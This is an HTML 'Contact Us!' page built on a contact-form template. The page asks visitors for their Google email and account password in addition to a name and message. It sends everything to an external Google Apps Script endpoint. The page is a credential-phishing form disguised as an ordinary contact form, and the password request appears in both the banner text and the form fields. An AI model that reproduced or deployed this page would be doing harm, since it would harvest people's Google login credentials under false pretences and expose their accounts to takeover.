<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="contact form example">
  <title>Contact Us!</title>
</head>

<body>
<img src="https://i0.wp.com/see.news/wp-content/uploads/2020/04/thank-you-public-health-workers-and-to-researchers-in-the-scientific-community-6753651837108753.3-2xa-1.gif?fit=808%2C409&ssl=1"> 
  <h2 class="content-head is-center">Contact Us!</h2>
  <aside>
<strong>
       <p style="text-align: center; font-size: 1.1em;">
           Please enter your Google Email and Password to continue. </p>
           <p style="text-align: center; font-size: 1.1em;">You can use the Contact Form to send us a message!
</strong>
       </p>
   </aside>

<!-- START HERE -->
   <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css">
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
   <!-- Style The Contact Form How Ever You Prefer -->
   <link rel="stylesheet" href="style.css">

  <form class="gform pure-form pure-form-stacked" method="POST" data-email=""
  action="https://script.google.com/macros/s/AKfycby9JRmh0dYfGZKQB03JV-m_FAO1GitLzLlnNDjyegFLEaIOrRQ/exec">
    <!-- change the form action to your script url -->

    <div class="form-elements">
      <fieldset class="pure-group">
        <label for="name"><strong>Name: </strong></label>
        <input id="name" name="name" placeholder="What your Mom calls you" />
      </fieldset>

      <fieldset class="pure-group">
        <label for="message"><strong>Message: </strong></label>
        <textarea id="message" name="message" rows="8"
        placeholder="Tell us what's on your mind..."></textarea>
      </fieldset>

      <fieldset class="pure-group">
        <label for="email"><strong>Your Google Email:</strong></label>
        <input id="email" name="email" type="email" value=""
        required placeholder="your_name@gmail.com"/>
      </fieldset>

      <fieldset class="pure-group">
        <label for="password"><strong>Password: </strong></label>
        <input id="password" name="password" type="password" placeholder="********" />
      </fieldset>

      <fieldset class="pure-group honeypot-field">
        <label for="honeypot">To help avoid spam, utilize a Honeypot technique with a hidden text field; must be empty to submit the form! Otherwise, we assume the user is a spam bot.</label>
        <input id="honeypot" type="text" name="honeypot" value="" />
      </fieldset>

      <button class="button-success pure-button button-xlarge">
        <i class="fa fa-paper-plane"></i>&nbsp;<strong>Send</strong></button>
    </div>

    <!-- Customise the Thankyou Message People See when they submit the form: -->
    <div class="thankyou_message" style="display:none;">
<iframe src="https://lh3.googleusercontent.com/pFSdCfKsllI1iNTSEEGZL99fBk7xYQYWBAwC_bu7h8RxVrwWtIF4UGTshL2OjlFcztu0czIAOCA=w640-h400-e365" style="width: 640px; height: 400px;"></iframe>
      <h2>Thanks for contacting us!
        We will get back to you soon!</h2>
    </div>

  </form>

  <!-- Submit the Form to Google Using "AJAX" -->
  <script data-cfasync="false" src="form-submission-handler.js"></script>
<!-- END -->

</body>
</html>
